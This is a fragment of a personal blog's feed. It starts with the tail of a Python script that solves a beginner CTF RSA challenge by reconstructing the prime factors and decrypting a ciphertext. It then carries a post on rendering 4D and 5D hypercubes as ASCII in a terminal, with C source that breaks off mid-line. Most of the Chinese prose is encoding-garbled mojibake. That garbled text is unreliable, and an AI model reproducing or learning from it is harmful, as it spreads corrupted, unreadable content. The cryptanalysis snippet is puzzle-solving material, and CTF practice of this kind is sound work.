class="built_in">int</span>(<span class="string">&#x27;1&#x27;</span>+q,<span class="number">2</span>)*<span class="built_in">int</span>(<span class="string">&#x27;0&#x27;</span>+p,<span class="number">2</span>))[-index:]==n[-index:]:</span><br><span class="line">            f(<span class="string">&#x27;1&#x27;</span>+q,<span class="string">&#x27;0&#x27;</span>+p,index+<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="string">&#x27;0&#x27;</span>+q,<span class="number">2</span>)*<span class="built_in">int</span>(<span class="string">&#x27;1&#x27;</span>+p,<span class="number">2</span>))[-index:]==n[-index:]:</span><br><span class="line">            f(<span class="string">&#x27;0&#x27;</span>+q,<span class="string">&#x27;1&#x27;</span>+p,index+<span class="number">1</span>)</span><br><span class="line">f(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">print(count)</span><br><span class="line">n = <span class="built_in">int</span>(n,<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(pp[i],<span class="number">2</span>)*<span class="built_in">int</span>(qq[i],<span class="number">2</span>)==n:</span><br><span class="line">        phi=(<span class="built_in">int</span>(pp[i],<span class="number">2</span>)-<span class="number">1</span>)*(<span class="built_in">int</span>(qq[i],<span class="number">2</span>)-<span class="number">1</span>)</span><br><span class="line">        e=<span class="number">65537</span></span><br><span class="line">        c=<span class="number">57928739525594987887296575374030551510625601525690046551520041216593791573788</span></span><br><span class="line">        d =inverse(e,phi)</span><br><span class="line">        print(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br></pre></td></tr></table></figure>    </div></div><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;p&gt;ä¸€ä¸ªé¢å‘æ–°äººçš„ç®€å•å¯†ç é¢˜&lt;/p&gt;</summary>
    
    
    
    <category term="Crypyto" scheme="https://kyriota.github.io/categories/Crypyto/"/>
    
    
    <category term="CTF" scheme="https://kyriota.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Hello Dimension</title>
    <link href="https://kyriota.github.io/2021/04/24/Hello_Dimension/"/>
    <id>https://kyriota.github.io/2021/04/24/Hello_Dimension/</id>
    <published>2021-04-24T09:28:20.000Z</published>
    <updated>2022-05-04T08:35:06.580Z</updated>
    
    <content type="html"><![CDATA[<p>Meet Hypercubes~ O(âˆ©_âˆ©)O</p><p>ğŸ¦è¯­è¨€æ¸²æŸ“nç»´ç«‹æ–¹ä½“è‡³ç»ˆç«¯ï¼Œé‚£çœŸæ˜¯éå¸¸amazingå•Š</p><img src="/images/4Hypercube-transparent.gif" height="200" width="200" /><span id="more"></span><h1 id="Hello-Dimension"><a href="#Hello-Dimension" class="headerlink" title="Hello Dimension"></a>Hello Dimension</h1><p align="right"><small>So all this just to render a cube on your terminal ?</small></p><blockquote><p>åæ¥åšæˆå·¥ç¨‹æ¦‚è®ºå¤§ä½œä¸šçš„<a href="https://kyriota.com/html/hypercube/">ç½‘é¡µç‰ˆæœ¬</a>(æ‰‹æœºæ…ç‚¹)ï¼Œä½¿ç”¨äº†<code>threejs</code>è¿™ä¸ªå›¾å½¢åº“æ¥ç»˜åˆ¶å’Œæ‰“å…‰ï¼Œæ¯”èµ·æ§åˆ¶å°æ¥è¯´è™½ç„¶ä¸é‚£ä¹ˆgeekï¼Œä½†æ˜¯ç¨å¾®æ›´ç›´è§‚é‚£ä¹ˆäº¿ç‚¹ï¼Œåº”è¯¥è¿˜å­˜åœ¨ä¸€äº›bugï¼Œä½†æ˜¯3ï¼Œ4ï¼Œ5ç»´ä¸‹åº”è¯¥æ˜¯æ²¡ä»€ä¹ˆé—®é¢˜</p></blockquote><p>å°é¢gifä¸ºè¶…ç«‹æ–¹ä½“ç»•xwä¸xzè½´çš„æ—‹è½¬ï¼Œè‡³äºç»“æœçš„æ­£ç¡®æ€§ï¼Œæˆ‘å‚ç…§äº†wikiä¸”è‡ªè®¤ä¸ºæ— è¯¯ï¼Œä¾‹å¦‚ä¸‹å›¾å°±æ˜¯ä¸€äº›ä¸è¶…ç«‹æ–¹ä½“ç›¸å…³çš„å›¾ç‰‡</p><center><table>    <tr>        <td ><center><img src="/images/HypercubeStructure.gif" width=200 height=200>è¶…ç«‹æ–¹ä½“è§£æ„</center></td>        <td ><center><img src="/images/wikiHypercube.gif" width=200 height=200>è¶…ç«‹æ–¹ä½“ç»•xwè½´æ—‹è½¬</center></td>    </tr></table></center>ä¸å¦¨å…ˆæ¥çœ‹çœ‹æˆ‘çš„ä»£ç éƒ½æ¸²æŸ“å‡ºäº†äº›ä»€ä¹ˆï¼š<table><thead><tr><th>å›¾åƒ</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><img src="/images/4HypercubeOpen.gif" width=500 height=500></td><td>æ­¤ä¸ºåœ¨<a href="https://kyriota.com/2021/04/19/%E5%9B%BE%E5%BD%A2%E5%AD%A6HelloWorld/">å›¾å½¢å­¦HelloWorld</a>åŸºç¡€ä¸Šä¿®æ”¹çš„ä»£ç ï¼Œé™äºæ¨¡å‹ç”ŸæˆåŸç†ä¸æ¸²æŸ“åŸç†å†™çš„ç¨€çƒ‚è€Œæ— æ³•æ‹“å±•åˆ°æ›´é«˜çš„äº”ç»´ï¼Œä¸”ç”±äºæ³•å‘é‡å¹¶éå®æ—¶è®¡ç®—è€Œæ˜¯æ‰‹åŠ¨è®¾ç½®ï¼Œå¯¼è‡´æ—‹è½¬æ—¶çš„â€å››ç»´é¢â€œæ¸²æŸ“é”™è¯¯ï¼ˆå°±æ˜¯gifä¸­çœ‹è§æ˜æ˜¾æ˜¯ä¸ªæ­£æ–¹ä½“ä½†æ˜¯å´æ²¡æœ‰æ­£ç¡®çš„æ‰“å…‰çš„ä¸€å¨åè¿‡æ¥åå›å»çš„ä¸œè¥¿ï¼‰</td></tr><tr><td><img src="/images/4Hypercube.gif" width=500 height=500></td><td>åæ¥å¯¹æ¨¡å‹ç”ŸæˆåŸç†ä¸æ¸²æŸ“åŸç†å¤§æ”¹ï¼Œå¼•å…¥é¡¶ç‚¹æ¨¡å‹å¹¶å®æ—¶è®¡ç®—æ³•å‘é‡ï¼Œæ­£ç¡®æ¸²æŸ“å‡ºäº†è¿™ä¸ªè¶…ç«‹æ–¹ä½“</td></tr><tr><td><img src="/images/5Hypercube.gif" width=500 height=500></td><td>åœ¨å››ç»´å‡äº”ç»´æ—¶åˆå‡ºç°äº†ä»£ç é€šç”¨æ€§çš„é—®é¢˜ï¼Œå‘ç°äº”ç»´æ—¶å­˜åœ¨å¤šå¤„ä¸‰è§’å½¢çš„å„é¡¶ç‚¹å‡ ä¹ä½äºåŒä¸€ç›´çº¿çš„æƒ…å†µï¼Œå¯¹åˆ¤æ–­è´¨å¿ƒä¸ç›´çº¿å…³ç³»çš„æ–¹ç¨‹å¼•å…¥ä¸€ä¸ªå¾ˆå°çš„Î”offestè§£å†³æ­¤é—®é¢˜</td></tr></tbody></table><p>æœ€åå†™äº†é€æ˜æè´¨ï¼Œä¸ºäº†æ–¹ä¾¿å’Œå®é™…æ•ˆæœæ²¡æœ‰å¯¹é€æ˜æè´¨è®¡ç®—å…‰ç…§ï¼Œé€æ˜ç‰©ä½“ä»£ç æ¯”ä¸é€æ˜çš„ç®€å•ï¼Œä½†ç¡®å®ä¾¿åˆ©äº†ç†è§£å†…éƒ¨ç»“æ„å˜åŒ–</p><center><table>    <tr>        <td ><center><img src="/images/4Hypercube-transparent.gif" width=200 height=200>é€æ˜å››ç»´ </center></td>        <td ><center><img src="/images/5Hypercube-transparent.gif" width=200 height=200>é€æ˜äº”ç»´</center></td>    </tr></table></center><div class='spoiler collapsed'>    <div class='spoiler-title'>        å¯¹æ¸²æŸ“ä¸æ¨¡å‹çš„æ”¹è¿›å¤§çº²    </div>    <div class='spoiler-content'>        <ul><li><p>ä¸‰è§’å½¢ï¼šå…ˆå‰çš„æ­£æ–¹ä½“å’Œçƒä½“æ¨¡å‹éƒ½æ˜¯å®é™…å­˜åœ¨äºæ•°ç»„ä¸­çš„éå¸¸å¤šçš„ç‚¹ï¼Œæ¯ä¸ªç‚¹ä¸å±å¹•ä¸Šçš„ç‚¹å¯¹åº”ï¼Œä¸ä»…ç©ºé—´å ç”¨å¤šï¼Œç®—åŠ›è·Ÿä¸ä¸Šï¼Œæ³•å‘é‡ä¹Ÿæ˜¯é’ˆå¯¹æ­£æ–¹ä½“å’Œçƒä½“çš„å‡ ä½•æ€§è´¨ä¸ºå…¶æ‰‹åŠ¨å®‰æ’çš„ï¼Œç¼ºä¹æ™®é€‚æ€§</p><ul><li>è§£å†³ï¼šå¯¹äºæ­£æ–¹ä½“ï¼Œåªéœ€è¦æ±‚å‡ºæ­£æ–¹ä½“çš„é¡¶ç‚¹ä»¥åŠé¡¶ç‚¹ä¹‹é—´çš„ä½ç½®å…³ç³»ï¼ˆå“ªäº›é¡¶ç‚¹ç›¸é‚»ï¼‰ï¼Œå³å¯ç”±æ­¤æ¨å¾—ä¸‰è§’å½¢ã€å››æ£±é”¥ç­‰ç‹¬ç«‹çš„å±€éƒ¨å›¾å½¢ï¼Œè¿™å¸¦æ¥çš„å¥½å¤„æœ‰ï¼š<ul><li>æ™®é€‚æ€§å¢å¼ºï¼Œå³ä½¿ç‰©ä½“ä¸æ˜¯æ­£æ–¹ä½“ä¹Ÿèƒ½ä»¥æ­¤æ–¹å¼è®¡ç®—ã€æ¸²æŸ“</li><li>æ€§èƒ½æå‡ï¼Œç»´åº¦å¾—ä»¥å‡çš„æ›´é«˜ï¼Œè®¡ç®—é€Ÿåº¦å¿«äº†äº¿ç‚¹ç‚¹</li><li>å¯ä»¥é€šè¿‡è®¡ç®—å±€éƒ¨è´¨å¿ƒå‡†ç¡®åŒºåˆ†å†…å¤–æ³•å‘é‡ï¼Œä½†æ˜¯æ­¤å¤„çš„æ­£æ–¹ä½“æ˜¯å‡¸å‡ ä½•ä½“ï¼Œç›´æ¥ä»¥åŸç‚¹ï¼ˆæ­£æ–¹ä½“è´¨å¿ƒï¼‰åŒºåˆ†å†…å¤–æ³•å‘é‡ä¹Ÿæ˜¯è¶³å¤Ÿçš„</li></ul></li></ul></li><li><p>å†…å¤–æ³•å‘é‡ï¼šç°æœ‰ä¸€æ¨¡å‹çš„ç›¸é‚»ä¸‰ç‚¹ç¡®å®šçš„å¹³é¢ABCï¼Œå¦‚ä½•åŒºåˆ†å†…å¤–æ³•å‘é‡ï¼Ÿ</p><ul><li><p>è§£å†³ï¼šå› ä¸ºæˆ‘é¢å¯¹çš„å¯¹è±¡æ˜¯æ­£æ–¹ä½“ï¼Œæ‰€ä»¥åªè¦å¯¹ä»»æ„é¡¶ç‚¹å‘é‡åŠ ä¸Šæ³•å‘é‡ï¼Œå°†ä½œæ­¤åç§»åçš„å‘é‡ä¸å…¶å¯¹åº”é¡¶ç‚¹å‘é‡æ¯”è¾ƒæ¨¡é•¿å¤§å°ï¼Œå³å¯åˆ¤æ–­å†…å¤–æ³•å‘é‡</p><img src="/images/HelloDimension_å¤–æ³•å‘é‡.jpg" width=200 height=200><p>ä½†è¿™æ ·ä¼šåœ¨å‡¹å‡ ä½•ä½“ä¸Šæœ‰è¯¯</p><img src="/images/HelloDimension_å…¨å±€è´¨å¿ƒ.jpg" width=200 height=200><p>æ‰€ä»¥æ™®é€‚çš„åšæ³•åº”æ˜¯å†å¯»æ‰¾ä¸€ä¸ªç›¸é‚»é¡¶ç‚¹ï¼Œç¡®å®šä¸€ä¸ªå››é¢ä½“ï¼Œè®¡ç®—æ­¤å››é¢ä½“è´¨å¿ƒï¼Œç„¶åä»¥æ­¤è´¨å¿ƒä¸ºåŸºå‡†ä½œåŒæ ·çš„åç§»åçš„æ¨¡é•¿æ¯”è¾ƒ</p></li></ul></li><li><p>é€è§†æŠ•å½±ï¼šäººçœ¼è§‚å¯Ÿç‰©ä½“æ˜¯å°å­”æˆåƒï¼Œé€è§†æŠ•å½±ï¼Œæ­£æŠ•å½±ä¼šç¼ºå°‘è¿‘å¤§è¿œå°çš„ç‰¹å¾ï¼Œä¸”åªæœ‰åœ¨é™ç»´æ—¶é€è§†æŠ•å½±æ‰èƒ½ä½¿é«˜ç»´å‡ ä½•ä½“æŠ•å½±å‡ºä»¤äººæ»¡æ„çš„æ•ˆæœï¼ˆå¦åˆ™å°±æ˜¯é»æˆä¸€å¨æ‰­æ¥æ‰­æ›²ï¼Œæ²¡æœ‰å¤§å°å˜åŒ–ï¼‰ï¼Œé€è§†æŠ•å½±çš„æŠ•å½±çŸ©é˜µé€šè¿‡ä¸€ä¸ªç›¸ä¼¼ä¸‰è§’å½¢å°±å‡ºæ¥äº†ï¼Œç‚¹åˆ°ä¸ºæ­¢</p></li><li><p>åŠé€æ˜æè´¨ï¼šå°±ç®€ä¸å°±ç¹ï¼Œå†ç²¾è‡´çš„é€æ˜æè´¨åœ¨ç»ˆç«¯ä¹Ÿçœ‹ä¸å‡ºæ¥ï¼Œæˆ‘çš„åšæ³•æ˜¯ä¸å†è®¡ç®—æ³•å‘é‡ï¼Œå‘ç°æŠ•å½±åˆ°å±å¹•ä¸Šçš„é¢æœ‰å‡ ä¸ªï¼Œè¯¥ç‚¹çš„alphaå°±åŠ åˆ°å‡ ï¼Œç„¶ååº”ç”¨ä¸‹é¢è¿™ä¸ªå¼å­æŠŠalphaæ¢å› [0,1) å†…ï¼ˆæ•´ä¸ªå¹‚ä¸»è¦æ˜¯æƒ³è®©æ›²çº¿å¹³æ»‘ä¸€ç‚¹ï¼Œå»æ‰ä¹Ÿå¯ä»¥ï¼‰</p>  <center><code>alpha=1-1/(k*alpha+1)^3/2</code></center></li></ul>    </div></div><p>ä»¥ä¸‹æ˜¯æœ€ç»ˆçš„æºç ï¼Œé‡è¦å‚æ•°å…¨éƒ¨åœ¨defineæˆ–å…¨å±€å˜é‡ä¸­</p><blockquote><p>åè®°ï¼šçªç„¶å‘ç°æœ‰ä¸€å¤„ç”¨äº†<code>public</code>åšäº†å˜é‡å/æ‚è„¸ï¼Œä½†æ˜¯Cè¯­è¨€æ²¡æœ‰classï¼Œæ‰€ä»¥é‚£é‡Œçš„publicæ˜¯æŒ‡æ¨¡å‹çš„å…¬å…±é¡¶ç‚¹</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> a 8.0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pi 3.1415926</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> size 55</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> delta 0.5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> deltaA 0.02</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> eOffest 0.001</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> dimension 5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> transparent 0.6</span></span><br><span class="line"><span class="keyword">char</span> shade[]=<span class="string">&quot;.,:;!om0&amp;%@&quot;</span>;</span><br><span class="line"><span class="keyword">float</span> lightSrcDis=<span class="number">5</span>*a;</span><br><span class="line"><span class="keyword">float</span> light[<span class="number">3</span>]=&#123;<span class="number">-2</span>,<span class="number">5</span>,<span class="number">0.8</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> rotateAround[]=&#123;<span class="number">3</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">2</span>&#125;;</span><br><span class="line"><span class="keyword">float</span> vAxis[]     =&#123; <span class="number">3</span> , <span class="number">1</span> &#125;;</span><br><span class="line"><span class="keyword">float</span> initialCam[<span class="number">3</span>]=&#123;<span class="number">0</span>,pi*<span class="number">5</span>/<span class="number">24</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">calLength</span><span class="params">(<span class="keyword">float</span> *vec,<span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">float</span> result=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++) result+=vec[i]*vec[i];</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sqrt</span>(result);&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">float</span> lightLength=calLength(&amp;light[<span class="number">0</span>],<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) light[i]/=lightLength;</span><br><span class="line">    <span class="keyword">float</span> out_f[size][size],dis[size][size]=&#123;(<span class="keyword">float</span>)<span class="number">4</span>*size&#125;;</span><br><span class="line">    <span class="keyword">float</span> move=(size<span class="number">-1</span>)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> face=((<span class="keyword">int</span>)(<span class="built_in">pow</span>(<span class="number">2</span>,dimension<span class="number">-3</span>)*dimension*(dimension<span class="number">-1</span>)));</span><br><span class="line">    <span class="keyword">int</span> vexNum=(<span class="keyword">int</span>)(<span class="built_in">pow</span>(<span class="number">2</span>,dimension))*dimension;</span><br><span class="line">    <span class="keyword">int</span> vexLink[vexNum],normalLink[<span class="number">6</span>*face];</span><br><span class="line">    <span class="keyword">float</span> vex[vexNum],vexO[vexNum],vexProjected[vexNum],vexTemp[vexNum];</span><br><span class="line">    <span class="keyword">float</span> normalResultSet[<span class="number">6</span>*face];</span><br><span class="line">    <span class="built_in">memset</span>(vexLink,<span class="number">0xff</span>,<span class="keyword">sizeof</span>(vexLink));</span><br><span class="line">    <span class="built_in">memset</span>(normalLink,<span class="number">0xff</span>,<span class="keyword">sizeof</span>(normalLink));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;vexNum;i++) vex[i]=a;</span><br><span class="line">    vex[dimension]=-a;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">2</span>,difference,sign,i;vexIndex*dimension&lt;vexNum;vexIndex++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(sign=<span class="number">0</span>;sign&lt;dimension;sign++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;vexIndex<span class="number">-1</span>;i++)&#123;difference=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;dimension&amp;&amp;!difference;k++)</span><br><span class="line">                    <span class="keyword">if</span>(sign==k?vex[i*dimension+k]!=<span class="number">-1</span>*vex[(vexIndex<span class="number">-1</span>)*dimension+k]:vex[i*dimension+k]!=vex[(vexIndex<span class="number">-1</span>)*dimension+k]) difference=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>(!difference) <span class="keyword">break</span>;</span><br><span class="line">            &#125;<span class="keyword">if</span>(difference) <span class="keyword">break</span>;</span><br><span class="line">        &#125;<span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;dimension;k++) vex[vexIndex*dimension+k]=k==sign?<span class="number">-1</span>*vex[(vexIndex<span class="number">-1</span>)*dimension+k]:vex[(vexIndex<span class="number">-1</span>)*dimension+k];&#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>,n=<span class="number">0</span>;vexIndex*dimension&lt;vexNum;vexIndex++,n=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> linkIndex=<span class="number">0</span>;linkIndex&lt;vexIndex;linkIndex++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;dimension;i++)</span><br><span class="line">                <span class="keyword">if</span>(vexLink[linkIndex*dimension+i]==vexIndex) vexLink[vexIndex*dimension+n++]=linkIndex;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=vexIndex+<span class="number">1</span>,difference=<span class="number">0</span>,tooManyDiff,sign;i*dimension&lt;vexNum&amp;&amp;n!=dimension;i++,difference=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;dimension&amp;&amp;difference&lt;=<span class="number">1</span>;k++)</span><br><span class="line">                <span class="keyword">if</span>(vex[i*dimension+k]!=vex[vexIndex*dimension+k]) difference++;</span><br><span class="line">            <span class="keyword">if</span>(difference==<span class="number">1</span>) vexLink[vexIndex*dimension+n++]=i;&#125;&#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> cur1=<span class="number">0</span>,normalIndex=<span class="number">0</span>;cur1&lt;vexNum/dimension&amp;&amp;normalIndex!=<span class="number">2</span>*face;cur1+=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> cur2=<span class="number">0</span>,pDiag=<span class="number">0</span>;cur2&lt;vexNum/dimension&amp;&amp;normalIndex!=<span class="number">2</span>*face;cur2++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(cur1==cur2) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;dimension&amp;&amp;!pDiag;i++)</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;dimension&amp;&amp;!pDiag;j++)</span><br><span class="line">                    <span class="keyword">if</span>(vexLink[vexLink[cur1*dimension+i]*dimension+j]==cur2) pDiag=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(pDiag)&#123;</span><br><span class="line">                <span class="keyword">int</span> <span class="keyword">public</span>[dimension<span class="number">-1</span>];</span><br><span class="line">                <span class="built_in">memset</span>(<span class="keyword">public</span>,<span class="number">0xff</span>,<span class="keyword">sizeof</span>(<span class="keyword">public</span>));</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,k=<span class="number">0</span>;i&lt;dimension&amp;&amp;k&lt;dimension<span class="number">-1</span>;i++)</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;dimension&amp;&amp;k&lt;dimension<span class="number">-1</span>;j++)</span><br><span class="line">                        <span class="keyword">if</span>(vexLink[cur1*dimension+i]==vexLink[cur2*dimension+j]) <span class="keyword">public</span>[k++]=vexLink[cur1*dimension+i];</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=normalIndex;i++)</span><br><span class="line">                    <span class="keyword">if</span>  (   (cur1==normalLink[i*<span class="number">3</span>]||cur1==normalLink[i*<span class="number">3</span>+<span class="number">1</span>]||cur1==normalLink[i*<span class="number">3</span>+<span class="number">2</span>])</span><br><span class="line">                        &amp;&amp;  (cur2==normalLink[i*<span class="number">3</span>]||cur2==normalLink[i*<span class="number">3</span>+<span class="number">1</span>]||cur2==normalLink[i*<span class="number">3</span>+<span class="number">2</span>]))</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;dimension<span class="number">-1</span>;j++)</span><br><span class="line">                            <span class="keyword">if</span>(<span class="keyword">public</span>[j]==normalLink[i*<span class="number">3</span>]||<span class="keyword">public</span>[j]==normalLink[i*<span class="number">3</span>+<span class="number">1</span>]||<span class="keyword">public</span>[j]==normalLink[i*<span class="number">3</span>+<span class="number">2</span>]) <span class="keyword">public</span>[j]=<span class="number">-1</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;dimension<span class="number">-1</span>;i++)</span><br><span class="line">                    <span class="keyword">if</span>(<span class="keyword">public</span>[i]!=<span class="number">-1</span>)&#123;</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">3</span>;j++)normalLink[normalIndex*<span class="number">3</span>+j]=j==<span class="number">0</span>?cur1:j==<span class="number">1</span>?cur2:<span class="keyword">public</span>[i];</span><br><span class="line">                        normalIndex++;&#125;&#125;&#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(vexTemp,vex,<span class="keyword">sizeof</span>(vex[<span class="number">0</span>])*vexNum);</span><br><span class="line">    <span class="built_in">memcpy</span>(vexO,vex,<span class="keyword">sizeof</span>(vex[<span class="number">0</span>])*vexNum);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">float</span> angle=<span class="number">0</span>;;angle+=deltaA)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size;i++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size;j++)&#123;</span><br><span class="line">                out_f[i][j]=<span class="number">-1</span>;</span><br><span class="line">                dis[i][j]=(<span class="keyword">float</span>)(<span class="number">-4.0</span>*size);&#125;</span><br><span class="line">        <span class="built_in">memcpy</span>(vex,vexO,<span class="keyword">sizeof</span>(vexO));</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>;vexIndex&lt;vexNum/dimension;vexIndex++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> rotationIndex=<span class="number">0</span>,r_i=<span class="number">0</span>;rotationIndex&lt;<span class="keyword">sizeof</span>(rotateAround)/<span class="keyword">sizeof</span>(rotateAround[<span class="number">0</span>])/<span class="number">2</span>;rotationIndex++,r_i=<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">memcpy</span>(vexTemp,vex,<span class="keyword">sizeof</span>(vex));</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;dimension;i++)</span><br><span class="line">                    <span class="keyword">if</span>(i==rotateAround[rotationIndex*<span class="number">2</span>+r_i])</span><br><span class="line">                        vex[vexIndex*dimension+i]=vexTemp[vexIndex*dimension+i]*<span class="built_in">cos</span>(vAxis[rotationIndex]*angle)+vexTemp[vexIndex*dimension+rotateAround[rotationIndex*<span 